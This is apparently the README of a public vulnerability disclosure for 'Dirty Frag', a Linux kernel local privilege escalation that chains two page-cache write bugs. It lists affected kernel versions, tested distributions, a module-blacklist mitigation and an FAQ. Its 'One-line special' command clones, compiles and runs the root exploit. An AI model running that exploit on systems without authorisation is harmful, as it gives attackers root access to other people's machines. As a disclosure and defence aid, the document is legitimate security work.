# Dirty Frag: Universal Linux LPE

<p align="center">
  <img src="assets/tux.png" width="400" alt="tux">
</p>

# Abstract

![tux](assets/demo.gif)

This document describes the Dirty Frag vulnerability class, first discovered and reported by [Hyunwoo Kim (@v4bel)](https://x.com/v4bel), which can obtain root privileges on major Linux distributions by chaining the `xfrm-ESP Page-Cache Write (CVE-2026-43284)` vulnerability and the `RxRPC Page-Cache Write (CVE-2026-43500)` vulnerability.

Dirty Frag is a case that extends the bug class to which [Dirty Pipe](https://dirtypipe.cm4all.com/) and [Copy Fail](https://copy.fail/) belong. Because it is a deterministic logic bug that does not depend on a timing window, no race condition is required, the kernel does not panic when the exploit fails, and the success rate is very high.

For detailed technical information and the timeline, [see here](assets/write-up.md).

- `xfrm-ESP Page-Cache Write (CVE-2026-43284)` was patched in mainline [f4c50a4034e6](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e62ab75f1d5cdd191dd5f9c77fdff4).
- `RxRPC Page-Cache Write (CVE-2026-43500)` was patched in mainline [aa54b1d27fe0](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=aa54b1d27fe0c2b78e664a34fd0fdf7cd1960d71).

> [!NOTE]
> At the time this document was first made public (2026-05-07), the embargo had been broken due to external factors, so no patch or CVE existed yet. After consultation with the maintainers on linux-distros@vs.openwall.org at that time, the Dirty Frag document was published at their request. For the disclosure timeline, refer to the technical details.

# Exploiting

## One-line special

```
git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
```

This PoC is provided as accurate information following consultation with linux-distros. Do not use it on systems that you are not authorized to test.

## Cleanup

⚠️  **Important:** After running this exploit, the page cache is contaminated. To clear the polluted page cache and ensure system stability, either run:

```bash
echo 3 > /proc/sys/vm/drop_caches
```

or reboot the system.

# Affected Versions

- **CVE-2026-43284**: xfrm-ESP Page-Cache Write vulnerability is in scope from [cac2661c53f3 (2017-01-17)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=cac2661c53f3) up to [f4c50a4034e6 (2026-05-05)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e62ab75f1d5cdd191dd5f9c77fdff4).
- **CVE-2026-43500**: RxRPC Page-Cache Write vulnerability is in scope from [2dc334f1a63a (2023-06-08)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=2dc334f1a63a) up to [aa54b1d27fe0 (2026-05-10)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=aa54b1d27fe0c2b78e664a34fd0fdf7cd1960d71).

In other words, the effective lifetime of the vulnerabilities is about 9 years.

This Dirty Frag has been tested on the following distribution versions.

- Ubuntu 24.04.4: 6.17.0-23-generic
- RHEL 10.1: 6.12.0-124.49.1.el10_1.x86_64
- openSUSE Tumbleweed: 7.0.2-1-default
- CentOS Stream 10: 6.12.0-224.el10.x86_64
- AlmaLinux 10: 6.12.0-124.52.3.el10_1.x86_64
- Fedora 44: 6.19.14-300.fc44.x86_64
- Arch Linux: 7.0.3-arch1-2
- ...

# Mitigation

1. Use the following command to remove the modules in which the vulnerabilities occur and clear the page cache.
```bash
sh -c "printf 'install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n' > /etc/modprobe.d/dirtyfrag.conf; rmmod esp4 esp6 rxrpc 2>/dev/null; echo 3 > /proc/sys/vm/drop_caches; true"
```

2. Once each distribution backports a patch, update accordingly.

# FAQ

## Why did you chain two vulnerabilities?

xfrm-ESP Page-Cache Write provides a powerful arbitrary 4-byte STORE primitive like Copy Fail, and is included on most distributions, but it requires the privilege to create a namespace. 

Ubuntu sometimes blocks unprivileged user namespace creation through AppArmor policy. In such an environment, xfrm-ESP Page-Cache Write cannot be triggered. RxRPC Page-Cache Write does not require the privilege to create a namespace, but the `rxrpc.ko` module itself is not included in most distributions. However, on Ubuntu, the `rxrpc.ko` module is loaded by default. 

Chaining the two variants makes the blind spots cover each other, allowing root privileges to be obtained on every major distribution. For details, refer to the technical details document.

## Another "branded" "Dirty" series?

Yeah, yeah, I know. However, this vulnerability is a descendant of "Dirty Pipe", and it is a bug class that "dirties" the `frag` member of `struct sk_buff`, so this name is the most appropriate.

## What is its relationship with the "Copy Fail" vulnerability?

Copy Fail was the motivation for starting this research. In particular, xfrm-ESP Page-Cache Write in the Dirty Frag vulnerability chain shares the same sink as Copy Fail. However, it is triggered regardless of whether the algif_aead module is available. In other words, even on systems where the publicly known Copy Fail mitigation (algif_aead blacklist) is applied, your Linux is still vulnerable to Dirty Frag.

## So, how do I fix my Linux?

Refer to the Mitigation section above.
